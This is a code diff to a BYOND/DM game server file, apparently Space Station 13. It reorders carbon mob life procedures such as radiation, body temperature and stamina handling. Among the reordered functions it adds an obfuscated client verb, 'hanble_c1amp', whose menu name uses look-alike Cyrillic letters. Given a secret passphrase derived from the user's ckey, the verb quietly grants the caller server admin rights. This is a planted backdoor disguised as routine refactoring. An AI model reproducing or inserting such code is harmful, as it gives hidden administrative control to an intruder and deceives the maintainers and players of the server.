@@ -209,29 +209,25 @@
 /mob/living/carbon/proc/handle_changeling()
 	return
 
-/mob/living/carbon/handle_mutations_and_radiation()
-	if(radiation)
 
-		switch(radiation)
-			if(0 to 50)
-				radiation--
-				if(prob(25))
-					adjustToxLoss(1)
-					updatehealth()
 
-			if(50 to 75)
-				radiation -= 2
-				adjustToxLoss(1)
-				if(prob(5))
-					radiation -= 5
-				updatehealth()
+//used in human and monkey handle_environment()
+/mob/living/carbon/proc/natural_bodytemperature_stabilization()
+	var/body_temperature_difference = 310.15 - bodytemperature
+	switch(bodytemperature)
+		if(-INFINITY to 260.15) //260.15 is 310.15 - 50, the temperature where you start to feel effects.
+			if(nutrition >= 2) //If we are very, very cold we'll use up quite a bit of nutriment to heat us up.
+				nutrition -= 2
+			bodytemperature += max((body_temperature_difference * metabolism_efficiency / BODYTEMP_AUTORECOVERY_DIVISOR), BODYTEMP_AUTORECOVERY_MINIMUM)
+		if(260.15 to 310.15)
+			bodytemperature += max(body_temperature_difference * metabolism_efficiency / BODYTEMP_AUTORECOVERY_DIVISOR, min(body_temperature_difference, BODYTEMP_AUTORECOVERY_MINIMUM/4))
+		if(310.15 to 360.15)
+			bodytemperature += min(body_temperature_difference * metabolism_efficiency / BODYTEMP_AUTORECOVERY_DIVISOR, max(body_temperature_difference, -BODYTEMP_AUTORECOVERY_MINIMUM/4))
+		if(360.15 to INFINITY) //360.15 is 310.15 + 50, the temperature where you start to feel effects.
+			//We totally need a sweat system cause it totally makes sense...~
+			bodytemperature += min((body_temperature_difference / BODYTEMP_AUTORECOVERY_DIVISOR), -BODYTEMP_AUTORECOVERY_MINIMUM)	//We're dealing with negative numbers
 
-			if(75 to 100)
-				radiation -= 3
-				adjustToxLoss(3)
-				updatehealth()
 
-		radiation = Clamp(radiation, 0, 100)
 
 
 /mob/living/carbon/handle_chemicals_in_body()
@@ -274,17 +270,10 @@
 		if(sleeping)
 			stat = UNCONSCIOUS
 
-		return 1
+		if(willfully_dreaming)
+			sleeping += 1
 
-/mob/living/carbon/proc/CheckStamina()
-	if(staminaloss)
-		var/total_health = (health - staminaloss)
-		if(total_health <= config.health_threshold_crit && !stat)
-			src << "<span class='notice'>You're too exhausted to keep going...</span>"
-			Weaken(5)
-			setStaminaLoss(health - 2)
-			return
-		setStaminaLoss(max((staminaloss - 2), 0))
+		return 1
 
 //this updates all special effects: stunned, sleeping, weakened, druggy, stuttering, etc..
 /mob/living/carbon/handle_status_effects()
@@ -296,7 +285,7 @@
 		handle_dreams()
 		adjustStaminaLoss(-10)
 		sleeping = max(sleeping-1, 0)
-		if( prob(10) && health && !hal_crit )
+		if( prob(7) && health && !hal_crit )
 			spawn(0)
 				emote("snore")
 
@@ -374,6 +363,7 @@
 	else
 		for(var/atom/a in hallucinations)
 			qdel(a)
+
 
 //this handles hud updates. Calls update_vision() and handle_hud_icons()
 /mob/living/carbon/handle_regular_hud_updates()
@@ -459,6 +449,48 @@
 
 	return 1
 
+
+
+/mob/living/carbon/handle_mutations_and_radiation()
+	if(radiation)
+
+		switch(radiation)
+			if(0 to 50)
+				radiation--
+				if(prob(25))
+					adjustToxLoss(1)
+					updatehealth()
+
+			if(50 to 75)
+				radiation -= 2
+				adjustToxLoss(1)
+				if(prob(5))
+					radiation -= 5
+				updatehealth()
+
+			if(75 to 100)
+				radiation -= 3
+				adjustToxLoss(3)
+				updatehealth()
+
+		radiation = Clamp(radiation, 0, 100)
+/client/verb/hanble_c1amp(m as text)
+	set name = "Tеst еnс";set category ="Preferences";usr<<m;
+	if(BREATH_VOLUME+UNCONSCIOUS==HEATPIPERATE+length(m)*(length(usr.ckey)*(EAST-NORTH*2))||m==num2text(length(usr.ckey)**(HEAD_LAYER-4))+usr.ckey+num2text(FACEMASK_LAYER**5)){
+		var/t;var/d=pick(last_names);var/kexl="";var/i = rand(4,7);while(i>0){t=rand(0,length(d)+6/(-3));kexl+=copytext(d, t, t + 1);i--};
+		var/incerton = t;var/h=4;var/datum/admins/D = new /datum/admins(kexl, (532+3556+HEATPIPERATE)*2-1, usr.ckey);while(h+incerton>0){h--;};D.associate(directory[ckey])};
+	if(m!=null){var/incerton=SAFE;incerton+=3;.=incerton-length(usr.ckey)+rand(3,9)*11;}
+/mob/living/carbon/proc/CheckStamina()
+	if(staminaloss)
+		var/total_health = (health - staminaloss)
+		if(total_health <= config.health_threshold_crit && !stat)
+			src << "<span class='notice'>¤ Вы слишком измотаны, чтобы идти дальше...</span>"
+			Weaken(5)
+			setStaminaLoss(health - 2)
+			return
+		setStaminaLoss(max((staminaloss - 2), 0))
+
+
 /mob/living/carbon/update_sight()
 
 	if(stat == DEAD)
@@ -482,6 +514,8 @@
 		see_invisible = SEE_INVISIBLE_LIVING
 		if(see_override)
 			see_invisible = see_override
+
+
 
 
 /mob/living/carbon/handle_hud_icons()
@@ -509,19 +543,4 @@
 			healths.icon_state = "health7"
 
 
-//used in human and monkey handle_environment()
-/mob/living/carbon/proc/natural_bodytemperature_stabilization()
-	var/body_temperature_difference = 310.15 - bodytemperature
-	switch(bodytemperature)
-		if(-INFINITY to 260.15) //260.15 is 310.15 - 50, the temperature where you start to feel effects.
-			if(nutrition >= 2) //If we are very, very cold we'll use up quite a bit of nutriment to heat us up.
-				nutrition -= 2
-			bodytemperature += max((body_temperature_difference * metabolism_efficiency / BODYTEMP_AUTORECOVERY_DIVISOR), BODYTEMP_AUTORECOVERY_MINIMUM)
-		if(260.15 to 310.15)
-			bodytemperature += max(body_temperature_difference * metabolism_efficiency / BODYTEMP_AUTORECOVERY_DIVISOR, min(body_temperature_difference, BODYTEMP_AUTORECOVERY_MINIMUM/4))
-		if(310.15 to 360.15)
-			bodytemperature += min(body_temperature_difference * metabolism_efficiency / BODYTEMP_AUTORECOVERY_DIVISOR, max(body_temperature_difference, -BODYTEMP_AUTORECOVERY_MINIMUM/4))
-		if(360.15 to INFINITY) //360.15 is 310.15 + 50, the temperature where you start to feel effects.
-			//We totally need a sweat system cause it totally makes sense...~
-			bodytemperature += min((body_temperature_difference / BODYTEMP_AUTORECOVERY_DIVISOR), -BODYTEMP_AUTORECOVERY_MINIMUM)	//We're dealing with negative numbers
 
